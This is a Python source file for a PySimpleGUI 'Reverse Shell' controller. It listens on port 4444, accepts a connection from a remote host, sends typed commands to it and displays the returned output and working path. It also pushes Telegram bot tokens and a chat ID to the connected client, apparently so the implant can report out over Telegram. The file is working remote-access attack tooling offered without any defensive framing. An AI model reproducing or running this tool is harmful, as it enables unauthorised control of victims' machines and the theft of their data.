import socket
import os, sys
import threading
from time import sleep
import PySimpleGUI as sg

import json
from random import randint

import cv2

from base64 import b64decode, b64encode
import numpy as np

#from TakePic import name

from psutil import process_iter
from signal import SIGTERM


def kill_port(port):
    print("\nFinding process...")
    for proc in process_iter():
        for conns in proc.connections(kind='inet'):
            if str(port) in str(conns.laddr.port):
                print("Process found")
                proc.send_signal(SIGTERM)


def handle(addr, port, window):
    global s
    s = socket.socket()
    print("Socket created")

    try:
        s.bind((addr, port))
    except Exception as e:
        print(e)
        sys.exit(0)
    s.listen()
    print("Listening...")
    global conn
    global raddr

    conn, raddr = s.accept()

    #sending=threading.Thread(target=sendng, args=[s, window, ])
    #sending.start()

    print(f"Connection accepted from {raddr[0]}:{raddr[1]}")
    window["state"].update("CONNECTED")
    window["state"].update(text_color="green")
    window.refresh()

    while True:
        try:
            try:
                data = conn.recv(4096)
            except ConnectionError or ConnectionResetError:
                print("Connection interrupted by remote host.\n")
                try:
                    kill_port(port)
                except Exception:
                    pass
            if not data:
                window["state"].update("DISCONNECTED")
                break
            elif data.decode("cp850").startswith("<UPDATEPATH>"):           #"<UPDATEPATH>" in data.decode("cp850"#)
                pth=data[12:].decode()
                window["path"].update(str(pth).replace("\\\\", "\\"))
                del data


            #elif data.decode().endswith("\nEND"):
            #    dt=data.decode()
            #    print("JESUS")
            #    print(np.array(eval(dt.replace("\nEND", ""))))
            #    break


            else:
                try:
                    print(data.decode("cp850"))
                except AttributeError:
                    print(f"DATA:{type(data)}")
                    print(f"\n\nDATA:\n{data}")
    
                #del data
    
        except Exception as e:
            print(f"On Server : {e}")
            print(f"data : {type(data)}\n data[12:] : {type(data[12:])}\n data cp850 : {type(data.decode('cp850'))}")

    else:
        print("Connection interrupted by host")


def window_func():

    if os.path.isfile("config.json"):
        try:
            var = json.load(open("config.json"))

            host = var["host"]
            port = var["port"]
            token = var["token"]
            chat_id = var["chat_id"]

        except Exception as e:
            print(f"\n{e}\n")

    else:
        host = "0.0.0.0"
        port = 4444
        token = ""
        chat_id = ""

    layout = [ [ sg.Text("HOST: "), sg.Input(host, key="addr", size=(30, 1)), sg.Text("TOKEN:  "), sg.Input(token, size=(30, 1), key="TelToken"), sg.Button("SEND CREDENTIALS", key="send_cred_telegram"), sg.Push() ],
               [ sg.Text("PORT: "), sg.Input(port, key="port", size=(30, 1)), sg.Text("CHAT_ID:"), sg.Input(chat_id, size=(30, 1), key="TelChatID"), sg.Text("--- FOR TELEGRAM ---", background_color="black", text_color="BLUE"), sg.Push() ],
               [ sg.Text("State: "),  sg.Text("DISCONNECTED", text_color="red", background_color="black", key="state"), sg.Push() ],
               [ sg.Button("BIND", size=(17, 1), key="bind", expand_x=True), sg.Button("STOP", size=(17, 1), key="stop", expand_x=True), sg.Button("CLEAR", size=(17, 1), key="cls", expand_x=True) ],
               [ sg.Output(size=(40, 15), font=("Arial", 11), expand_x=True, expand_y=True, key="output_shit") ],
               [ sg.Text("Path", key="path"), sg.InputText(size=(30, 1), expand_x=True, key="cmd"), sg.Button("SEND", key="send", bind_return_key=True)] ]
    
    window = sg.Window("Reverse Shell", layout=layout, resizable=True)

    def send(s, message):
        for i in range(1):
            s.send(message.encode())
            break

    def send_telegram_credential(s, token, chat_id):
        for i in range(1):
            s.send(f"<TOKEN>{token}".encode())
            s.send(f"<CHAT_ID>{chat_id}".encode())
            break
    
    while True:
        event, value = window.read()

        try:
            host = value["addr"]
        except TypeError:
            continue
        port = value["port"]


        if event == sg.WIN_CLOSED:
            break

        elif event == "cls":
            window["output_shit"].update("")

        elif event == "send" and value["cmd"] != "" and value["cmd"] != None:
            sendThr=threading.Thread(target=send, args=[conn, value["cmd"]])
            sendThr.start()
            del sendThr
            window["cmd"].update("")

        elif event == "send_cred_telegram":
            token = value["TelToken"]
            chat_id = value["TelChatID"]
            #send_telegram_credential(s, token, chat_id)
            sendTelegramThr=threading.Thread(target=send_telegram_credential, args=[conn, token, chat_id])
            sendTelegramThr.start()
            del sendTelegramThr

        elif event == "bind" and port.isdigit():
            handle_thread=threading.Thread(target=handle, args=[host, int(port), window ])
            handle_thread.start()

        elif event == "stop":
            kill_port(port)

win_thread = threading.Thread(target=window_func)
win_thread.start()